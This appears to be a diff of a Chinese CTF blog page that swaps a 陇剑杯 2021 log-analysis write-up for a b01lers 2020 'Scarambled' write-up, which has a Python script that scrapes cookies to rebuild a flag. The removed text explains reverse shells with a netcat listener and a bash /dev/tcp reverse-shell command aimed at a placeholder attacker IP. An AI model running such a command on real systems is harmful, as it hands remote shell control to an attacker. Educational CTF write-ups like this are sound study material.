@@ -19,28 +19,26 @@
   <meta name="author" content="everythingis-ok">
   <meta name="keywords" content="">
   
-    <meta name="description" content="[陇剑杯 2021]简单日志分析（问3） 先解释一下什么是反弹shell, “反弹 shell”（reverse shell）是渗透测试和网络安全中非常核心的概念之一。 简单说：它是一种让被控主机主动连接攻击者主机，从而获得交互式命令行控制权的方式。 在正常情况（正向 shell）下，是攻击者主动连接目标，比如： 1nc target_ip 4444  这是“我去找你”。 而反弹 shell 是相">
+    <meta name="description" content="[b01lers 2020]Scarambled一道很有意思的题。 网页调用了一个youtube的视频。 观察到cookie中有两个特别的值frequency和 tranmissions每一次点击网页中reload 发现frequency会增加1，tranmissions中被kxkxkxkxsh包裹的中间部分也会发生变化。  假如把kxkxkxkxsh部分忽略掉，剩下的部分分成三部分：1(红箭头)">
 <meta property="og:type" content="article">
-<meta property="og:title" content="[陇剑杯 2021]简单日志分析（问3）">
-<meta property="og:url" content="http://example.com/2025/10/26/%E9%99%87%E5%89%91%E6%9D%AF-2021-%E7%AE%80%E5%8D%95%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%EF%BC%88%E9%97%AE3%EF%BC%89/index.html">
+<meta property="og:title" content="[b01lers 2020]Scarambled">
+<meta property="og:url" content="http://example.com/2025/11/04/b01lers-2020-Scarambled/index.html">
 <meta property="og:site_name" content="haomeng&#39;s blog^^">
-<meta property="og:description" content="[陇剑杯 2021]简单日志分析（问3） 先解释一下什么是反弹shell, “反弹 shell”（reverse shell）是渗透测试和网络安全中非常核心的概念之一。 简单说：它是一种让被控主机主动连接攻击者主机，从而获得交互式命令行控制权的方式。 在正常情况（正向 shell）下，是攻击者主动连接目标，比如： 1nc target_ip 4444  这是“我去找你”。 而反弹 shell 是相">
+<meta property="og:description" content="[b01lers 2020]Scarambled一道很有意思的题。 网页调用了一个youtube的视频。 观察到cookie中有两个特别的值frequency和 tranmissions每一次点击网页中reload 发现frequency会增加1，tranmissions中被kxkxkxkxsh包裹的中间部分也会发生变化。  假如把kxkxkxkxsh部分忽略掉，剩下的部分分成三部分：1(红箭头)">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-10-26_14-33-16.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-10-25_23-03-35.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-10-25_23-04-36.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-10-25_23-05-48.png">
-<meta property="article:published_time" content="2025-10-26T06:38:19.000Z">
-<meta property="article:modified_time" content="2025-10-26T06:40:05.303Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20251104115200747.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20251104121513715.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20251104121011106.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20251104123029383.png">
+<meta property="article:published_time" content="2025-11-04T04:35:42.000Z">
+<meta property="article:modified_time" content="2025-11-04T04:36:29.251Z">
 <meta property="article:author" content="everythingis-ok">
-<meta property="article:tag" content="NSSCTF">
-<meta property="article:tag" content="日志分析">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-10-26_14-33-16.png">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20251104115200747.png">
   
   
   
-  <title>[陇剑杯 2021]简单日志分析（问3） - haomeng&#39;s blog^^</title>
+  <title>[b01lers 2020]Scarambled - haomeng&#39;s blog^^</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -206,7 +204,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="[陇剑杯 2021]简单日志分析（问3）"></span>
+            <span id="subtitle" data-typed-text="[b01lers 2020]Scarambled"></span>
           
         </div>
 
@@ -217,8 +215,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-10-26 14:38" pubdate>
-          2025年10月26日 下午
+        <time datetime="2025-11-04 12:35" pubdate>
+          2025年11月4日 下午
         </time>
       </span>
     
@@ -229,7 +227,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          243 字
+          510 字
         
       </span>
     
@@ -240,7 +238,7 @@
         
         
         
-          3 分钟
+          5 分钟
         
       </span>
     
@@ -277,31 +275,26 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">[陇剑杯 2021]简单日志分析（问3）</h1>
+            <h1 id="seo-header">[b01lers 2020]Scarambled</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="陇剑杯-2021-简单日志分析（问3）"><a href="#陇剑杯-2021-简单日志分析（问3）" class="headerlink" title="[陇剑杯 2021]简单日志分析（问3）"></a>[陇剑杯 2021]简单日志分析（问3）</h1><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-10-26_14-33-16.png" srcset="/img/loading.gif" lazyload alt="PixPin_2025-10-26_14-33-16"></p>
-<p>先解释一下什么是反弹shell,</p>
-<p>“反弹 shell”（reverse shell）是渗透测试和网络安全中非常核心的概念之一。<br> 简单说：它是一种<strong>让被控主机主动连接攻击者主机，从而获得交互式命令行控制权</strong>的方式。</p>
-<p>在正常情况（正向 shell）下，是攻击者主动连接目标，比如：</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> target_ip <span class="hljs-number">4444</span><br></code></pre></td></tr></table></figure>
+                <h1 id="b01lers-2020-Scarambled"><a href="#b01lers-2020-Scarambled" class="headerlink" title="[b01lers 2020]Scarambled"></a>[b01lers 2020]Scarambled</h1><p>一道很有意思的题。</p>
+<p>网页调用了一个youtube的视频。</p>
+<p>观察到cookie中有两个特别的值<code>frequency和</code> <code>tranmissions</code>每一次点击网页中<code>reload</code> 发现<code>frequency</code>会增加1，<code>tranmissions</code>中被kxkxkxkxsh包裹的中间部分也会发生变化。</p>
+<p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20251104115200747.png" srcset="/img/loading.gif" lazyload alt="image-20251104115200747"></p>
+<p>假如把kxkxkxkxsh部分忽略掉，剩下的部分分成三部分：1(红箭头)2(黄箭头)3(黄线)</p>
+<p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20251104121513715.png" srcset="/img/loading.gif" lazyload alt="image-20251104121513715"></p>
+<p>记录下来一些数据，我们会发现</p>
+<p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20251104121011106.png" srcset="/img/loading.gif" lazyload alt="image-20251104121011106"></p>
+<p>数据中第三部分代表数据第二部分的位置，第一部分代表它存在于第二部分的前一个位置。</p>
+<p>比如说frequency22中： 第三部分20代表4在第二十个位置，那么-在第19个位置，刚好与frequency10对应。甚至可以看到frequency25中显示CT,像是CTF的一部分，猜测完全拼接后会得到flag。发现尝试编写脚本，刷新页面不断获取transmissions中变化的数据，按照规律把他们拼接起来应该能得到flag。</p>
+<p>脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> unquote<br><br>url = <span class="hljs-string">&#x27;http://d1653c98-47b9-4f04-b138-71cf1c76520c.node3.buuoj.cn/&#x27;</span><br>sess = requests.Session()<br><br><span class="hljs-comment"># 假设我们预期索引不会超过 200（可根据实际调整）</span><br>MAX_INDEX = <span class="hljs-number">200</span><br>data = [<span class="hljs-string">&#x27;&#x27;</span>] * MAX_INDEX<br>attempts = <span class="hljs-number">300</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(attempts):<br>    <span class="hljs-keyword">try</span>:<br>        resp = sess.get(url, timeout=<span class="hljs-number">5</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[!] 请求失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">continue</span><br><br>    cj = resp.cookies<br>    cookies_dict = requests.utils.dict_from_cookiejar(cj)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;transmissions&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> cookies_dict:<br>        <span class="hljs-comment"># 如果没有该 cookie，跳过这次</span><br>        <span class="hljs-keyword">continue</span><br><br>    raw = cookies_dict[<span class="hljs-string">&#x27;transmissions&#x27;</span>].replace(<span class="hljs-string">&#x27;kxkxkxkxsh&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>    decoded = unquote(raw)<br><br>    <span class="hljs-comment"># 简单的格式检查：至少要有 3 个字符（用于 [0:1] 和 [2:]）</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(decoded) &lt; <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">continue</span><br><br>    key_str = decoded[<span class="hljs-number">2</span>:]<br>    val = decoded[<span class="hljs-number">0</span>:<span class="hljs-number">1</span>]<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> key_str.isdigit():<br>        <span class="hljs-comment"># 如果索引不是数字，跳过</span><br>        <span class="hljs-keyword">continue</span><br><br>    idx = <span class="hljs-built_in">int</span>(key_str)<br>    <span class="hljs-keyword">if</span> idx &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> idx &gt;= MAX_INDEX:<br>        <span class="hljs-comment"># 索引超出预期范围，跳过或调整 MAX_INDEX</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[!] 跳过不合理索引: <span class="hljs-subst">&#123;idx&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">continue</span><br><br>    <span class="hljs-comment"># 写入（如果想避免覆盖，可以先判断是否已填充）</span><br>    <span class="hljs-keyword">if</span> data[idx] == <span class="hljs-string">&#x27;&#x27;</span>:<br>        data[idx] = val<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-comment"># 已存在，可以选择保留原值或替换，视场景决定</span><br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-comment"># 输出非空字符拼接成字符串</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span>.join(ch <span class="hljs-keyword">if</span> ch != <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;?&#x27;</span> <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> data)<br><span class="hljs-built_in">print</span>(flag)<br><br></code></pre></td></tr></table></figure>
 
-<p>这是“我去找你”。</p>
-<p>而<strong>反弹 shell 是相反的方向</strong>：被攻击的机器主动“反弹”一个连接回攻击者。<br> 换句话说：<strong>“你来找我”</strong>。</p>
-<p>例如，攻击者在自己的电脑上监听：</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvnp <span class="hljs-number">4444</span><br></code></pre></td></tr></table></figure>
-
-<p>然后让目标主机执行：</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bash</span> -i &gt;&amp; /dev/tcp/attacker_ip/<span class="hljs-number">4444</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
-
-<p>此时目标主机会主动连到攻击者的监听端口，攻击者就获得了一个 shell。</p>
-<p> 查看一下日志，有三段base64编码字符串，依次解码</p>
-<p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-10-25_23-03-35.png" srcset="/img/loading.gif" lazyload alt="PixPin_2025-10-25_23-03-35"></p>
-<p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-10-25_23-04-36.png" srcset="/img/loading.gif" lazyload alt="PixPin_2025-10-25_23-04-36"></p>
-<p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-10-25_23-05-48.png" srcset="/img/loading.gif" lazyload alt="PixPin_2025-10-25_23-05-48"></p>
-<p>很明显第三段是在反弹shell。</p>
+<p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20251104123029383.png" srcset="/img/loading.gif" lazyload alt="image-20251104123029383"></p>
+<h2 id="references"><a href="#references" class="headerlink" title="references"></a>references</h2><p><a target="_blank" rel="noopener" href="https://github.com/m3ssap0/CTF-Writeups/blob/master/b01lers%20CTF%202020/Scrambled/README.md">https://github.com/m3ssap0/CTF-Writeups/blob/master/b01lers%20CTF%202020/Scrambled/README.md</a></p>
 
                 
               </div>
@@ -311,15 +304,6 @@
               <div class="post-metas my-3">
   
   
-    <div class="post-meta">
-      <i class="iconfont icon-tags"></i>
-      
-        <a href="/tags/NSSCTF/" class="print-no-link">#NSSCTF</a>
-      
-        <a href="/tags/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/" class="print-no-link">#日志分析</a>
-      
-    </div>
-  
 </div>
 
 
@@ -328,8 +312,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>[陇剑杯 2021]简单日志分析（问3）</div>
-      <div>http://example.com/2025/10/26/陇剑杯-2021-简单日志分析（问3）/</div>
+      <div>[b01lers 2020]Scarambled</div>
+      <div>http://example.com/2025/11/04/b01lers-2020-Scarambled/</div>
     </div>
     <div class="license-meta">
       
@@ -341,7 +325,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2025年10月26日</div>
+          <div>2025年11月4日</div>
         </div>
       
       
@@ -373,18 +357,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/11/04/b01lers-2020-Scarambled/" title="[b01lers 2020]Scarambled">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">[b01lers 2020]Scarambled</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/10/24/SWPU-2020-%E5%A5%97%E5%A8%83/" title="[SWPU 2020]套娃">
-                        <span class="hidden-mobile">[SWPU 2020]套娃</span>
+                      <a href="/2025/10/26/%E9%99%87%E5%89%91%E6%9D%AF-2021-%E7%AE%80%E5%8D%95%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%EF%BC%88%E9%97%AE3%EF%BC%89/" title="[陇剑杯 2021]简单日志分析（问3）">
+                        <span class="hidden-mobile">[陇剑杯 2021]简单日志分析（问3）</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
